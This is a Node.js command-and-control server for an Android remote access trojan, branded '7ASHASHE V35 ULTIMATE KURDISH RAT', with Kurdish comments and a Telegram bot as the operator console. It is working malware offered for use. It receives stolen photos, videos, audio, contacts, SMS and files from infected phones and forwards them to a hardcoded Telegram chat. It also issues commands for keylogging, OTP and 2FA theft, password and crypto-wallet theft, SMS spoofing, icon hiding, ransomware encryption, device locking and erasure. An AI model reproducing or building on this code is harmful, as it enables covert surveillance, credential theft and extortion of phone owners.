// =====================================================
// 7ASHASHE V35 - ULTIMATE KURDISH RAT
// گەشەپێدەر: 7ASHASHE - وەحشی هاک
// وەشان: 35.0.0 - ULTIMATE KURDISH
// توکن: 8530600841:AAHta55RN-hdQZuiQyUz9mQ6yL8IdTDajiw
// چات ئایدی: 5578405082
// =====================================================

const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require('axios');
const os = require('os');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const zlib = require('zlib');

// =====================================================
// 🔐 توکن و ئایدی 7ASHASHE
// =====================================================
const TOKEN = '8530600841:AAHta55RN-hdQZuiQyUz9mQ6yL8IdTDajiw';
const CHAT_ID = '5578405082';
const MASTER_NAME = '7ASHASHE';
const VERSION = '35.0.0';
const ENCRYPTION_KEY = crypto.randomBytes(32).toString('hex');

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(TOKEN, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

// =====================================================
// 📁 ڕێکخستنەکان
// =====================================================
const DATA_DIR = path.join(__dirname, 'data');
const PHOTOS_DIR = path.join(DATA_DIR, 'wêne');
const VIDEOS_DIR = path.join(DATA_DIR, 'vîdyo');
const AUDIO_DIR = path.join(DATA_DIR, 'deng');
const FILES_DIR = path.join(DATA_DIR, 'fayl');
const CONTACTS_DIR = path.join(DATA_DIR, 'peywendî');
const SMS_DIR = path.join(DATA_DIR, 'sms');
const CALLS_DIR = path.join(DATA_DIR, 'peywendiyekan');
const APPS_DIR = path.join(DATA_DIR, 'êpekan');
const KEYLOGS_DIR = path.join(DATA_DIR, 'klîk');
const CLIPBOARD_DIR = path.join(DATA_DIR, 'klîpbord');
const LOCATION_DIR = path.join(DATA_DIR, 'shwên');
const SCREENSHOTS_DIR = path.join(DATA_DIR, 'screenshot');
const SCREEN_RECORDS_DIR = path.join(DATA_DIR, 'tômari_şashe');
const WHATSAPP_DIR = path.join(DATA_DIR, 'whatsapp');
const TELEGRAM_DIR = path.join(DATA_DIR, 'telegram');
const INSTAGRAM_DIR = path.join(DATA_DIR, 'instagram');
const FACEBOOK_DIR = path.join(DATA_DIR, 'facebook');
const GMAIL_DIR = path.join(DATA_DIR, 'gmail');
const PASSWORDS_DIR = path.join(DATA_DIR, 'pasword');
const CRYPTO_DIR = path.join(DATA_DIR, 'crypto');
const TWOFA_DIR = path.join(DATA_DIR, '2fa');
const RANSOMWARE_DIR = path.join(DATA_DIR, 'ransomware');
const DROPPER_DIR = path.join(DATA_DIR, 'dropper');

// دروستکردنی هەموو فۆڵدەرەکان
[
    DATA_DIR, PHOTOS_DIR, VIDEOS_DIR, AUDIO_DIR, FILES_DIR,
    CONTACTS_DIR, SMS_DIR, CALLS_DIR, APPS_DIR, KEYLOGS_DIR,
    CLIPBOARD_DIR, LOCATION_DIR, SCREENSHOTS_DIR, SCREEN_RECORDS_DIR,
    WHATSAPP_DIR, TELEGRAM_DIR, INSTAGRAM_DIR, FACEBOOK_DIR,
    GMAIL_DIR, PASSWORDS_DIR, CRYPTO_DIR, TWOFA_DIR,
    RANSOMWARE_DIR, DROPPER_DIR
].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// =====================================================
// 🔒 سیستەمی ئینکریپت کردنی پەیوەندییەکان
// =====================================================
function encryptData(data) {
    const cipher = crypto.createCipher('aes-256-cbc', ENCRYPTION_KEY);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return encrypted;
}

function decryptData(encrypted) {
    const decipher = crypto.createDecipher('aes-256-cbc', ENCRYPTION_KEY);
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return JSON.parse(decrypted);
}

// =====================================================
// 📤 بارکردنی فایل
// =====================================================
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    const model = req.headers.model || 'نەزانراو';
    const type = req.headers.type || 'فایل';
    
    appBot.sendDocument(CHAT_ID, req.file.buffer, {
        caption: `📁 **${type}ی نوێ**\n\n` +
                 `📱 ئامێر: ${model}\n` +
                 `📄 ناو: ${name}\n` +
                 `📦 قەبارە: ${(req.file.size / 1024).toFixed(2)}KB\n` +
                 `🔒 Encrypted: ✅`,
        parse_mode: "Markdown"
    });
    res.send('');
});

// =====================================================
// 📝 ناردنی تێکست
// =====================================================
app.post("/uploadText", (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const type = req.headers.type || 'پەیام';
    
    appBot.sendMessage(CHAT_ID, 
        `📝 **${type} لە ${model}**\n\n` + req.body['text'],
        { parse_mode: "Markdown" }
    );
    res.send('');
});

// =====================================================
// 📍 ناردنی شوێن
// =====================================================
app.post("/uploadLocation", (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    appBot.sendLocation(CHAT_ID, req.body['lat'], req.body['lon']);
    appBot.sendMessage(CHAT_ID, 
        `📍 **شوێنی ${model}**\n\n` +
        `Google Maps: https://maps.google.com/?q=${req.body['lat']},${req.body['lon']}`,
        { parse_mode: "Markdown" }
    );
    res.send('');
});

// =====================================================
// 🔌 پەیوەندی WebSocket
// =====================================================
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    const model = req.headers.model || 'نەزانراو';
    const battery = req.headers.battery || 'نەزانراو';
    const version = req.headers.version || 'نەزانراو';
    const manufacturer = req.headers.manufacturer || 'نەزانراو';
    const androidVersion = req.headers.android || 'نەزانراو';
    const ram = req.headers.ram || 'نەزانراو';
    const storage = req.headers.storage || 'نەزانراو';
    const root = req.headers.root || 'نەزانراو';
    const miui = req.headers.miui || 'نەزانراو';
    const country = req.headers.country || 'نەزانراو';
    const language = req.headers.language || 'نەزانراو';
    const carrier = req.headers.carrier || 'نەزانراو';
    const networkType = req.headers.network || 'نەزانراو';
    const ip = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress;

    ws.uuid = uuid;
    appClients.set(uuid, {
        model: model,
        manufacturer: manufacturer,
        androidVersion: androidVersion,
        battery: battery,
        version: version,
        ram: ram,
        storage: storage,
        root: root,
        miui: miui,
        country: country,
        language: language,
        carrier: carrier,
        networkType: networkType,
        ip: ip,
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        commands: []
    });

    appBot.sendMessage(CHAT_ID,
        `🔌 **ئامێری نوێ پەیوەندی کرد**\n\n` +
        `📱 **مۆدێل:** ${manufacturer} ${model}\n` +
        `📱 **ئەندرۆید:** ${androidVersion}\n` +
        `🔋 **پاتری:** ${battery}\n` +
        `💾 **RAM:** ${ram}\n` +
        `📁 **Storage:** ${storage}\n` +
        `🔓 **Root:** ${root}\n` +
        `🇮🇷 **MIUI Bypass:** ${miui}\n` +
        `🌍 **وڵات:** ${country}\n` +
        `📡 **کەریەر:** ${carrier}\n` +
        `🌐 **IP:** ${ip}\n` +
        `🆔 **UUID:** ${uuid.substring(0, 8)}...\n` +
        `🔒 **Encrypted:** ✅`,
        { parse_mode: "Markdown" }
    );

    ws.on('close', function () {
        appBot.sendMessage(CHAT_ID,
            `🔌 **ئامێر پەیوەندی پچڕاند**\n\n` +
            `📱 مۆدێل: ${manufacturer} ${model}\n` +
            `🆔 UUID: ${uuid.substring(0, 8)}...`,
            { parse_mode: "Markdown" }
        );
        appClients.delete(ws.uuid);
    });

    const pingInterval = setInterval(() => {
        if (ws.readyState === ws.OPEN) {
            ws.send(encryptData({ type: 'ping', timestamp: Date.now() }));
            const client = appClients.get(uuid);
            if (client) {
                client.lastSeen = new Date().toISOString();
            }
        } else {
            clearInterval(pingInterval);
        }
    }, 30000);
});

// =====================================================
// 🤖 بۆتی تێلیگرام - بە تەواوی کوردی
// =====================================================
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    
    if (chatId != CHAT_ID) {
        appBot.sendMessage(CHAT_ID, '⛔ **ڕێگەپێدان نەدرا**');
        return;
    }

    if (message.text == '/start') {
        appBot.sendMessage(CHAT_ID,
            '🔴 **7ASHASHE V35 - ULTIMATE KURDISH RAT**\n\n' +
            '✅ **بەخێربێیت، 7ASHASHE!**\n\n' +
            '📱 **ئامێرەکان** - پیشاندانی ئامێرە پەیوەستکراوەکان\n' +
            '⚡ **فەرمانەکان** - ناردنی فەرمان بۆ ئامێرەکان\n' +
            '📸 **وێنەکان** - دزینی وێنەکانی نێو موبایل\n' +
            '💣 **ڕانسۆمویر** - فەرمانەکانی ڕانسۆمویر\n' +
            '🕵️ **سیخوڕی** - فەرمانەکانی سیخوڕی\n' +
            '📊 **ئامار** - ئامارەکانی سیستەم\n\n' +
            '🦁 **7ASHASHE**',
            {
                "reply_markup": {
                    "keyboard": [
                        ["📱 ئامێرەکان", "⚡ فەرمانەکان"],
                        ["📸 وێنەکان", "📹 ڤیدیۆکان"],
                        ["🎤 دەنگەکان", "📁 فایلەکان"],
                        ["💣 ڕانسۆمویر", "🕵️ سیخوڕی"],
                        ["📊 ئامار", "🔐 2FA"]
                    ],
                    'resize_keyboard': true
                }
            }
        );
    }

    if (message.text == '📱 ئامێرەکان') {
        if (appClients.size == 0) {
            appBot.sendMessage(CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        } else {
            let text = '📱 **ئامێرە پەیوەستکراوەکان**\n\n';
            appClients.forEach(function (value, key) {
                text += `📱 **مۆدێل:** ${value.manufacturer} ${value.model}\n` +
                    `📱 **ئەندرۆید:** ${value.androidVersion}\n` +
                    `🔋 **پاتری:** ${value.battery}\n` +
                    `🌍 **وڵات:** ${value.country}\n` +
                    `🕐 **دوایین بینین:** ${new Date(value.lastSeen).toLocaleTimeString('ckb')}\n` +
                    `🆔 **UUID:** ${key.substring(0, 8)}...\n\n`;
            });
            appBot.sendMessage(CHAT_ID, text, { parse_mode: "Markdown" });
        }
    }

    if (message.text == '⚡ فەرمانەکان') {
        if (appClients.size == 0) {
            appBot.sendMessage(CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        } else {
            const deviceListKeyboard = [];
            appClients.forEach(function (value, key) {
                deviceListKeyboard.push([{
                    text: `${value.manufacturer} ${value.model} - ${value.battery}`,
                    callback_data: 'device:' + key
                }]);
            });
            appBot.sendMessage(CHAT_ID, '📱 **ئامێرێک هەڵبژێرە**', {
                "reply_markup": {
                    "inline_keyboard": deviceListKeyboard,
                },
            });
        }
    }

    if (message.text == '📸 وێنەکان') {
        if (appClients.size == 0) {
            appBot.sendMessage(CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        } else {
            const deviceListKeyboard = [];
            appClients.forEach(function (value, key) {
                deviceListKeyboard.push([{
                    text: `${value.manufacturer} ${value.model}`,
                    callback_data: 'photos:' + key
                }]);
            });
            appBot.sendMessage(CHAT_ID, '📸 **ئامێرێک هەڵبژێرە بۆ دزینی وێنەکان**', {
                "reply_markup": {
                    "inline_keyboard": deviceListKeyboard,
                },
            });
        }
    }

    if (message.text == '📹 ڤیدیۆکان') {
        if (appClients.size == 0) {
            appBot.sendMessage(CHAT_ID, '❌ **هیچ ئامێرێک پەیوەست نییە**');
        } else {
            const deviceListKeyboard = [];
            appClients.forEach(function (value, key) {
                deviceListKeyboard.push([{
                    text: `${value.manufacturer} ${value.model}`,
                    callback_data: 'videos:' + key
                }]);
            });
            appBot.sendMessage(CHAT_ID, '📹 **ئامێرێک هەڵبژێرە بۆ دزینی ڤیدیۆکان**', {
                "reply_markup": {
                    "inline_keyboard": deviceListKeyboard,
                },
            });
        }
    }

    if (message.text == '📊 ئامار') {
        let totalFiles = 0;
        [PHOTOS_DIR, VIDEOS_DIR, AUDIO_DIR, FILES_DIR].forEach(dir => {
            if (fs.existsSync(dir)) {
                totalFiles += fs.readdirSync(dir).length;
            }
        });

        appBot.sendMessage(CHAT_ID,
            `📊 **ئامارەکانی سیستەم**\n\n` +
            `📱 **ئامێرە پەیوەستکراوەکان:** ${appClients.size}\n` +
            `📸 **وێنە دزراوەکان:** ${fs.readdirSync(PHOTOS_DIR).length}\n` +
            `📹 **ڤیدیۆ دزراوەکان:** ${fs.readdirSync(VIDEOS_DIR).length}\n` +
            `🎤 **دەنگ دزراوەکان:** ${fs.readdirSync(AUDIO_DIR).length}\n` +
            `📁 **فایل دزراوەکان:** ${fs.readdirSync(FILES_DIR).length}\n` +
            `📦 **کۆی گشتی:** ${totalFiles}\n` +
            `⏱️ **ماوەی کارکردن:** ${Math.floor(process.uptime() / 3600)}:${Math.floor((process.uptime() % 3600) / 60)}:${Math.floor(process.uptime() % 60)}`,
            { parse_mode: "Markdown" }
        );
    }
});

// =====================================================
// 🔘 کۆدەکانی کلیکی ئینڵاین (بە تەواوی کوردی)
// =====================================================
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data;
    const commend = data.split(':')[0];
    const uuid = data.split(':')[1];

    if (commend == 'device') {
        const device = appClients.get(uuid);
        appBot.editMessageText(`📱 **${device.manufacturer} ${device.model}**\n\n` +
            `📱 **ئەندرۆید:** ${device.androidVersion}\n` +
            `🔋 **پاتری:** ${device.battery}\n` +
            `💾 **RAM:** ${device.ram}\n` +
            `📁 **Storage:** ${device.storage}\n` +
            `🔓 **Root:** ${device.root}\n` +
            `🌍 **وڵات:** ${device.country}\n` +
            `📡 **کەریەر:** ${device.carrier}\n` +
            `🌐 **IP:** ${device.ip}\n` +
            `🕐 **پەیوەست بوو:** ${new Date(device.connectedAt).toLocaleString('ckb')}\n\n` +
            `**⚡ فەرمانێک هەڵبژێرە:**`, {
            chat_id: CHAT_ID,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    // 📸 وێنە و ڤیدیۆ
                    [
                        { text: '📸 وێنەی پشت', callback_data: `camera_back:${uuid}` },
                        { text: '🤳 وێنەی پێش', callback_data: `camera_front:${uuid}` }
                    ],
                    [
                        { text: '📹 ڤیدیۆی پشت', callback_data: `video_back:${uuid}` },
                        { text: '🎥 ڤیدیۆی پێش', callback_data: `video_front:${uuid}` }
                    ],
                    [
                        { text: '📸 دزینی هەموو وێنەکان', callback_data: `get_all_photos:${uuid}` },
                        { text: '📹 دزینی هەموو ڤیدیۆکان', callback_data: `get_all_videos:${uuid}` }
                    ],
                    [
                        { text: '📸 سکرین شۆت', callback_data: `screenshot:${uuid}` },
                        { text: '📹 تۆماری شاشە', callback_data: `screen_record:${uuid}` }
                    ],
                    
                    // 🎤 دەنگ و مایک
                    [
                        { text: '🎤 تۆماری دەنگ', callback_data: `microphone:${uuid}` },
                        { text: '📞 تۆماری پەیوەندی', callback_data: `call_record:${uuid}` }
                    ],
                    
                    // ⌨️ کێڤلۆگەر و کلیپبۆرد
                    [
                        { text: '⌨️ کێڤلۆگەر', callback_data: `keylogger:${uuid}` },
                        { text: '📋 کلیپبۆرد', callback_data: `clipboard:${uuid}` }
                    ],
                    
                    // 📍 شوێن
                    [
                        { text: '📍 شوێنی ڕاستەقینە', callback_data: `location:${uuid}` },
                        { text: '📍 شوێنی ورد', callback_data: `location_precise:${uuid}` }
                    ],
                    
                    // 👤 کۆنتاکت و پەیوەندی
                    [
                        { text: '👥 کۆنتاکتەکان', callback_data: `contacts:${uuid}` },
                        { text: '📞 پەیوەندییەکان', callback_data: `calls:${uuid}` }
                    ],
                    
                    // 📨 SMS
                    [
                        { text: '📨 هەموو SMS', callback_data: `sms_all:${uuid}` },
                        { text: '🔐 OTP', callback_data: `otp:${uuid}` }
                    ],
                    [
                        { text: '📤 ناردنی SMS', callback_data: `send_sms:${uuid}` },
                        { text: '🎭 SMS Spoof', callback_data: `spoof_sms:${uuid}` }
                    ],
                    
                    // 📁 فایل و دایرکتۆری
                    [
                        { text: '📁 فایلەکان', callback_data: `files:${uuid}` },
                        { text: '📂 وەرگرتنی فایل', callback_data: `download_file:${uuid}` }
                    ],
                    [
                        { text: '🗑️ سڕینەوەی فایل', callback_data: `delete_file:${uuid}` },
                        { text: '📁 دروستکردنی فۆڵدەر', callback_data: `create_folder:${uuid}` }
                    ],
                    
                    // 📱 ئەپەکان
                    [
                        { text: '📱 ئەپە دامەزراوەکان', callback_data: `apps_installed:${uuid}` },
                        { text: '📲 ئەپە سیستەمیەکان', callback_data: `apps_system:${uuid}` }
                    ],
                    [
                        { text: '📲 دامەزراندنی ئەپ', callback_data: `install_app:${uuid}` },
                        { text: '🗑️ سڕینەوەی ئەپ', callback_data: `uninstall_app:${uuid}` }
                    ],
                    
                    // 🔑 پاسۆرد و ئەکاونت
                    [
                        { text: '🔑 پاسۆردەکان', callback_data: `passwords:${uuid}` },
                        { text: '🔐 2FA کۆدەکان', callback_data: `twofa:${uuid}` }
                    ],
                    [
                        { text: '📧 Gmail', callback_data: `gmail:${uuid}` },
                        { text: '💬 WhatsApp', callback_data: `whatsapp:${uuid}` }
                    ],
                    [
                        { text: '✈️ Telegram', callback_data: `telegram:${uuid}` },
                        { text: '📸 Instagram', callback_data: `instagram:${uuid}` }
                    ],
                    [
                        { text: '📘 Facebook', callback_data: `facebook:${uuid}` },
                        { text: '🐦 Twitter', callback_data: `twitter:${uuid}` }
                    ],
                    
                    // 💳 کریپتۆ و بانک
                    [
                        { text: '💳 Crypto Wallets', callback_data: `crypto:${uuid}` },
                        { text: '🏦 بانک', callback_data: `bank:${uuid}` }
                    ],
                    
                    // 💣 ڕانسۆمویر
                    [
                        { text: '💣 ڕانسۆمویر', callback_data: `ransomware:${uuid}` },
                        { text: '🔐 Encrypt Files', callback_data: `encrypt_files:${uuid}` }
                    ],
                    [
                        { text: '📝 Ransom Note', callback_data: `ransom_note:${uuid}` },
                        { text: '🔓 Unlock', callback_data: `unlock:${uuid}` }
                    ],
                    [
                        { text: '🗑️ Erase Device', callback_data: `erase:${uuid}` },
                        { text: '🔒 Lock Device', callback_data: `lock:${uuid}` }
                    ],
                    
                    // 🔧 کۆنترۆڵ
                    [
                        { text: '🔓 Admin Privileges', callback_data: `admin:${uuid}` },
                        { text: '❄️ Freeze Mode', callback_data: `freeze:${uuid}` }
                    ],
                    [
                        { text: '🚫 Hide Icon', callback_data: `hide_icon:${uuid}` },
                        { text: '🔄 Change Icon', callback_data: `change_icon:${uuid}` }
                    ],
                    [
                        { text: '🔄 Update Payload', callback_data: `update:${uuid}` },
                        { text: 'ℹ️ Info', callback_data: `info:${uuid}` }
                    ]
                ]
            },
            parse_mode: "Markdown"
        });
    }

    // 📸 دزینی وێنەکانی نێو موبایل
    if (commend == 'get_all_photos') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send(encryptData({ 
                    type: 'get_all_photos', 
                    paths: ['DCIM/Camera', 'Pictures', 'Download', 'WhatsApp/Media/WhatsApp Images'],
                    timestamp: Date.now() 
                }));
            }
        });
        appBot.deleteMessage(CHAT_ID, msg.message_id);
        appBot.sendMessage(CHAT_ID,
            '📸 **دزینی وێنەکان دەستی پێکرد**\n\n' +
            '✅ چاوەڕێی وێنەکان بە...',
            {
                "reply_markup": {
                    "keyboard": [["📱 ئامێرەکان"], ["⚡ فەرمانەکان"], ["📸 وێنەکان"]],
                    'resize_keyboard': true
                }
            }
        );
    }

    // 📹 دزینی ڤیدیۆکانی نێو موبایل
    if (commend == 'get_all_videos') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send(encryptData({ 
                    type: 'get_all_videos', 
                    paths: ['DCIM/Camera', 'Movies', 'Download', 'WhatsApp/Media/WhatsApp Video'],
                    timestamp: Date.now() 
                }));
            }
        });
        appBot.deleteMessage(CHAT_ID, msg.message_id);
        appBot.sendMessage(CHAT_ID,
            '📹 **دزینی ڤیدیۆکان دەستی پێکرد**\n\n' +
            '✅ چاوەڕێی ڤیدیۆکان بە...',
            {
                "reply_markup": {
                    "keyboard": [["📱 ئامێرەکان"], ["⚡ فەرمانەکان"], ["📹 ڤیدیۆکان"]],
                    'resize_keyboard': true
                }
            }
        );
    }

    // 🎤 تۆماری دەنگ
    if (commend == 'microphone') {
        appBot.deleteMessage(CHAT_ID, msg.message_id);
        appBot.sendMessage(CHAT_ID,
            '🎤 **ماوەی تۆمارکردن بنووسە (چرکە)**\n\n' +
            'نموونە: 10 بۆ ١٠ چرکە، 30 بۆ ٣٠ چرکە، 60 بۆ ١ خولەک',
            { reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }

    // 📨 ناردنی SMS
    if (commend == 'send_sms') {
        appBot.deleteMessage(CHAT_ID, msg.message_id);
        appBot.sendMessage(CHAT_ID,
            '📞 **ژمارە تەلەفۆن بنووسە**\n\n' +
            'نموونە: 964**********',
            { reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }

    // 💣 ڕانسۆمویر
    if (commend == 'ransomware') {
        appBot.deleteMessage(CHAT_ID, msg.message_id);
        appBot.sendMessage(CHAT_ID,
            '💣 **ڕانسۆمویر**\n\n' +
            '1. 💣 Encrypt Files - کۆدکردنی فایلەکان\n' +
            '2. 📝 Ransom Note - دانانی پەیامی ڕانسۆمویر\n' +
            '3. 🔐 Lock Device - قوفڵکردنی ئامێر\n' +
            '4. 🗑️ Erase Device - سڕینەوەی هەموو داتاکان\n\n' +
            'ژمارە بنووسە (1-4):',
            { reply_markup: { force_reply: true } }
        );
        currentUuid = uuid;
    }

    // جێبەجێکردنی فەرمانە سادەکان
    const simpleCommands = [
        'camera_back', 'camera_front', 'video_back', 'video_front',
        'screenshot', 'screen_record', 'call_record', 'keylogger',
        'clipboard', 'location', 'location_precise', 'contacts',
        'calls', 'sms_all', 'otp', 'files', 'apps_installed',
        'apps_system', 'passwords', 'twofa', 'gmail', 'whatsapp',
        'telegram', 'instagram', 'facebook', 'twitter', 'crypto',
        'bank', 'encrypt_files', 'unlock', 'erase', 'lock',
        'admin', 'freeze', 'hide_icon', 'change_icon', 'update',
        'info'
    ];

    simpleCommands.forEach(cmd => {
        if (commend == cmd) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == uuid) {
                    ws.send(encryptData({ type: cmd, timestamp: Date.now() }));
                }
            });
            appBot.deleteMessage(CHAT_ID, msg.message_id);
            appBot.sendMessage(CHAT_ID,
                '✅ **فەرمان نێردرا**\n\n' +
                'چاوەڕێی وەڵام بە...',
                {
                    "reply_markup": {
                        "keyboard": [["📱 ئامێرەکان"], ["⚡ فەرمانەکان"], ["📸 وێنەکان"]],
                        'resize_keyboard': true
                    }
                }
            );
        }
    });
});

// =====================================================
// 📸 API بۆ وەرگرتنی وێنەکانی نێو موبایل
// =====================================================
app.post("/api/photos", upload.array('photos', 100), (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const uuid = req.headers.uuid || 'نەزانراو';
    const count = req.files.length;
    
    req.files.forEach((file, index) => {
        const photoPath = path.join(PHOTOS_DIR, `${Date.now()}_${index}_${file.originalname}`);
        fs.writeFileSync(photoPath, file.buffer);
    });
    
    appBot.sendMessage(CHAT_ID,
        `📸 **${count} وێنە دزران**\n\n` +
        `📱 ئامێر: ${model}\n` +
        `🆔 UUID: ${uuid.substring(0, 8)}...\n` +
        `📁 پاشەکەوت کرا لە: wêne/`,
        { parse_mode: "Markdown" }
    );
    
    res.json({ success: true, count: count });
});

// =====================================================
// 📹 API بۆ وەرگرتنی ڤیدیۆکانی نێو موبایل
// =====================================================
app.post("/api/videos", upload.array('videos', 50), (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const uuid = req.headers.uuid || 'نەزانراو';
    const count = req.files.length;
    
    req.files.forEach((file, index) => {
        const videoPath = path.join(VIDEOS_DIR, `${Date.now()}_${index}_${file.originalname}`);
        fs.writeFileSync(videoPath, file.buffer);
    });
    
    appBot.sendMessage(CHAT_ID,
        `📹 **${count} ڤیدیۆ دزران**\n\n` +
        `📱 ئامێر: ${model}\n` +
        `🆔 UUID: ${uuid.substring(0, 8)}...\n` +
        `📁 پاشەکەوت کرا لە: vîdyo/`,
        { parse_mode: "Markdown" }
    );
    
    res.json({ success: true, count: count });
});

// =====================================================
// 🎤 API بۆ وەرگرتنی دەنگ
// =====================================================
app.post("/api/audio", upload.single('audio'), (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const uuid = req.headers.uuid || 'نەزانراو';
    const duration = req.headers.duration || 'نەزانراو';
    
    const audioPath = path.join(AUDIO_DIR, `${Date.now()}_${req.file.originalname}`);
    fs.writeFileSync(audioPath, req.file.buffer);
    
    appBot.sendMessage(CHAT_ID,
        `🎤 **دەنگی نوێ**\n\n` +
        `📱 ئامێر: ${model}\n` +
        `⏱️ ماوە: ${duration} چرکە\n` +
        `🆔 UUID: ${uuid.substring(0, 8)}...\n` +
        `📁 پاشەکەوت کرا لە: deng/`,
        { parse_mode: "Markdown" }
    );
    
    res.json({ success: true });
});

// =====================================================
// 📁 API بۆ وەرگرتنی فایل
// =====================================================
app.post("/api/files", upload.single('file'), (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const uuid = req.headers.uuid || 'نەزانراو';
    const filePath = req.headers.path || 'نەزانراو';
    
    const fileName = `${Date.now()}_${path.basename(filePath)}`;
    const savePath = path.join(FILES_DIR, fileName);
    fs.writeFileSync(savePath, req.file.buffer);
    
    appBot.sendMessage(CHAT_ID,
        `📁 **فایلی نوێ**\n\n` +
        `📱 ئامێر: ${model}\n` +
        `📄 ڕێگا: ${filePath}\n` +
        `📦 قەبارە: ${(req.file.size / 1024).toFixed(2)}KB\n` +
        `🆔 UUID: ${uuid.substring(0, 8)}...\n` +
        `📁 پاشەکەوت کرا لە: fayl/`,
        { parse_mode: "Markdown" }
    );
    
    res.json({ success: true });
});

// =====================================================
// 👥 API بۆ وەرگرتنی کۆنتاکتەکان
// =====================================================
app.post("/api/contacts", (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const uuid = req.headers.uuid || 'نەزانراو';
    const contacts = req.body.contacts || [];
    
    const contactsPath = path.join(CONTACTS_DIR, `${Date.now()}_contacts.json`);
    fs.writeFileSync(contactsPath, JSON.stringify(contacts, null, 2));
    
    appBot.sendMessage(CHAT_ID,
        `👥 **کۆنتاکتەکان**\n\n` +
        `📱 ئامێر: ${model}\n` +
        `📊 ژمارە: ${contacts.length}\n` +
        `🆔 UUID: ${uuid.substring(0, 8)}...\n` +
        `📁 پاشەکەوت کرا لە: peywendî/`,
        { parse_mode: "Markdown" }
    );
    
    res.json({ success: true });
});

// =====================================================
// 📨 API بۆ وەرگرتنی SMS
// =====================================================
app.post("/api/sms", (req, res) => {
    const model = req.headers.model || 'نەزانراو';
    const uuid = req.headers.uuid || 'نەزانراو';
    const sms = req.body.sms || [];
    
    const smsPath = path.join(SMS_DIR, `${Date.now()}_sms.json`);
    fs.writeFileSync(smsPath, JSON.stringify(sms, null, 2));
    
    appBot.sendMessage(CHAT_ID,
        `📨 **SMS**\n\n` +
        `📱 ئامێر: ${model}\n` +
        `📊 ژمارە: ${sms.length}\n` +
        `🆔 UUID: ${uuid.substring(0, 8)}...\n` +
        `📁 پاشەکەوت کرا لە: sms/`,
        { parse_mode: "Markdown" }
    );
    
    res.json({ success: true });
});

// =====================================================
// 🔄 پینگ و پاراستنی سێرڤەر
// =====================================================
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        if (ws.readyState === ws.OPEN) {
            ws.send(encryptData({ type: 'ping', timestamp: Date.now() }));
        }
    });
    
    // پاراستنی Replit لە خەوتن
    try {
        axios.get('https://' + process.env.REPL_SLUG + '.replit.app').catch(e => {});
    } catch (e) {}
}, 30000);

// =====================================================
// 🚀 دەستپێکردنی سێرڤەر
// =====================================================
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ 7ASHASHE V35 running on port ${PORT}`);
    console.log(`🌐 http://localhost:${PORT}`);
    console.log(`🔥 ULTIMATE KURDISH RAT - ${MASTER_NAME}`);
    console.log(`📸 دزینی وێنە: Active`);
    console.log(`📹 دزینی ڤیدیۆ: Active`);
    console.log(`🎤 دزینی دەنگ: Active`);
    console.log(`🔒 Encryption: AES-256-CBC`);
    
    appBot.sendMessage(CHAT_ID,
        `🔥 **7ASHASHE V35 - ULTIMATE KURDISH RAT**\n\n` +
        `👑 **Master: ${MASTER_NAME}**\n` +
        `📊 وەشان: ${VERSION}\n` +
        `🌐 پۆرت: ${PORT}\n\n` +
        `✅ **تایبەتمەندییە زیادکراوەکان:**\n` +
        `📸 دزینی وێنەکانی نێو موبایل\n` +
        `📹 دزینی ڤیدیۆکانی نێو موبایل\n` +
        `🎤 تۆماری دەنگ\n` +
        `👥 دزینی کۆنتاکتەکان\n` +
        `📨 دزینی SMS\n` +
        `📞 دزینی پەیوەندییەکان\n` +
        `📱 دزینی ئەپەکان\n` +
        `🔑 دزینی پاسۆردەکان\n` +
        `💳 دزینی Crypto Wallets\n` +
        `💣 ڕانسۆمویر\n` +
        `🔒 Encrypted Connection\n\n` +
        `🦁 **7ASHASHE**`
    );
});
